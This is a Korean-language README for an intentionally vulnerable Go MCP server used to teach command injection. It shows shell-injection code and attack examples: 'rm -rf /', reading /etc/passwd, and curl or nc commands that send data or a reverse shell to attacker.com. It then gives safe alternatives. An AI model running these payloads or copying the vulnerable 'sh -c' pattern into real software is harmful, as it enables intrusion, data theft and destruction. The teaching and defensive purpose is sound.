# Vulnerable MCP Server - Command Injection 예제 (Go)

## ⚠️ CRITICAL SECURITY WARNING ⚠️

**🚨 THIS SOFTWARE IS INTENTIONALLY VULNERABLE AND FOR EDUCATIONAL PURPOSES ONLY 🚨**

- ❌ **DO NOT USE IN PRODUCTION ENVIRONMENTS**
- ❌ **DO NOT USE ON SYSTEMS WITH REAL DATA**
- ❌ **DO NOT USE ON SYSTEMS ACCESSIBLE TO UNTRUSTED USERS**
- ✅ **USE ONLY IN ISOLATED, CONTROLLED ENVIRONMENTS**
- ✅ **USE ONLY FOR EDUCATIONAL AND TESTING PURPOSES**

**This software contains intentional Command Injection vulnerabilities for security education.**

## 개요

이 프로젝트는 Command Injection 취약점을 보여주는 교육용 MCP (Model Context Protocol) 서버입니다. 보안 취약점의 위험성을 이해하고 안전한 코딩 방법을 학습하기 위한 목적으로 제작되었습니다.

## 포함된 취약점

### 1. search_files 함수
```go
// 위험한 코드: 사용자 입력을 직접 shell 명령어에 삽입
command := fmt.Sprintf("find ./sandbox -name '%s' 2>/dev/null", filename)
cmd := exec.CommandContext(ctx, "sh", "-c", command)
output, err := cmd.CombinedOutput()
```

**취약점**: 사용자 입력이 직접 shell 명령어에 삽입됩니다.

**공격 예시**:
```
filename = "test.txt; rm -rf /"
filename = "test.txt && cat /etc/passwd"
filename = "test.txt | nc attacker.com 4444"
```

### 2. list_directory 함수
```go
// 위험한 코드: 사용자 입력을 직접 shell 명령어에 삽입
command := fmt.Sprintf("ls -la '%s' 2>/dev/null", path)
cmd := exec.CommandContext(ctx, "sh", "-c", command)
output, err := cmd.CombinedOutput()
```

**취약점**: 경로 입력이 직접 shell 명령어에 삽입됩니다.

**공격 예시**:
```
path = "/tmp; cat /etc/passwd"
path = "/tmp && whoami"
path = "/tmp | curl -X POST http://attacker.com/data -d @/etc/passwd"
```

### 3. execute_command 함수
```go
// 매우 위험한 코드: 사용자 입력을 그대로 shell에서 실행
cmd := exec.CommandContext(ctx, "sh", "-c", command)
output, err := cmd.CombinedOutput()
```

**취약점**: 사용자 입력을 그대로 shell에서 실행합니다. 가장 위험한 취약점입니다.

**공격 예시**:
```
command = "rm -rf /"
command = "curl -X POST http://attacker.com -d @/etc/passwd"
command = "nc -e /bin/bash attacker.com 4444"
```

## 실행 방법

1. Go 1.19 이상이 설치되어 있는지 확인하세요.

2. 의존성 설치:
```bash
go mod tidy
```

3. 서버 실행:
```bash
go run vulnerable_mcp_server.go
```

또는 바이너리로 빌드:
```bash
go build -o vulnerable_mcp_server vulnerable_mcp_server.go
./vulnerable_mcp_server
```

4. JSON-RPC 요청으로 도구 호출:
```json
{
  "jsonrpc": "2.0",
  "id": 1,
  "method": "tools/call",
  "params": {
    "name": "search_files",
    "arguments": {
      "filename": "test.txt"
    }
  }
}
```

## 안전한 대안

### 1. exec.Command에서 직접 인수 전달
```go
// 안전한 방법
cmd := exec.CommandContext(ctx, "find", "./sandbox", "-name", filename)
output, err := cmd.CombinedOutput()
```

### 2. 입력 검증 및 이스케이프
```go
import (
    "regexp"
    "fmt"
)

func validateFilename(filename string) error {
    // 파일명 검증
    matched, err := regexp.MatchString("^[a-zA-Z0-9._-]+$", filename)
    if err != nil || !matched {
        return fmt.Errorf("invalid filename")
    }
    return nil
}

// 사용 예시
func safeSearchFiles(filename string) (string, error) {
    if err := validateFilename(filename); err != nil {
        return "", err
    }
    
    // 안전한 명령어 실행
    cmd := exec.Command("find", "./sandbox", "-name", filename)
    output, err := cmd.CombinedOutput()
    return string(output), err
}
```

### 3. 허용된 명령어만 실행
```go
var allowedCommands = map[string]bool{
    "ls":   true,
    "find": true,
    "grep": true,
}

func executeSafeCommand(commandName string, args ...string) (string, error) {
    if !allowedCommands[commandName] {
        return "", fmt.Errorf("command not allowed: %s", commandName)
    }
    
    cmd := exec.Command(commandName, args...)
    output, err := cmd.CombinedOutput()
    return string(output), err
}
```

## 보안 모범 사례

1. **입력 검증**: 모든 사용자 입력을 검증하고 정제합니다.
2. **최소 권한 원칙**: 필요한 최소한의 권한만 부여합니다.
3. **화이트리스트**: 허용된 명령어나 패턴만 사용합니다.
4. **이스케이프**: 특수 문자를 적절히 이스케이프합니다.
5. **로그 기록**: 모든 명령어 실행을 로그에 기록합니다.

## 법적 고지

이 코드는 교육 목적으로만 제공됩니다. 악의적인 목적으로 사용하는 것은 불법이며, 저자는 그에 대한 책임을 지지 않습니다. 실제 시스템에서 테스트할 때는 격리된 환경에서만 수행하세요.

## 추가 학습 자료

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [Go os/exec 보안 가이드](https://pkg.go.dev/os/exec#hdr-Security_considerations)
- [MCP 공식 문서](https://modelcontextprotocol.io/)